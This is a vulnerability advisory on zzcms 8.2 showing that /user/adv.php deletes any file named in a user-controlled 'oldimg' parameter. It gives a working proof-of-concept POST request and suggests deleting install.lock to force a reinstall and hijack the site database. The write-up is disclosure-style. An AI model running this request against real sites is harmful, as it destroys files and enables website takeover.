# user/adv.php

##Edition:

zzcms 8.2

`/user/adv.php`

![][1]
### Code 

```
if ($oldimg<>$img){
		$f="../".$oldimg;
		if (file_exists($f)){
		unlink($f);		
		}
}


```
### Rows: 80

### Harm

Allows attackers to delete files arbitrarily

### Cause the cause

Through the code can know that we  control oldimg.

![][2]

The statement makes judgments on the account identities. If you want to exploit the vulnerability, the identity should be the company when you register the information.

Create flag.php file in test environment

![][3]

Then burp grab post request to change oldimg to flag.php

![][4]

Flag.php file successfully deleted

![][5]


## poc

```
POST /user/adv.php?action=modify

POST:

adv=123&advlink=%2Fzt%2Fshow.php%3Fid%3D2&company=%E4%BD%A0%E5%A5%BD%E5%95%8A&oldimg=flag.php&img=&Submit22=%E4%BF%AE+%E6%94%B9

```

An attacker can use this vulnerability to delete any file, such as deleting install.lock for CMS reinstall and hijacking the website database.

## Solution

Can be filtered through the input of control parameters, strictly control the type of parameters, suffixes



  [1]: ./images/1.png "1"
  [2]: ./images/2.png "2"
  [3]: ./images/3.png "3"
  [4]: ./images/4.png "4"
  [5]: ./images/5.png "5"



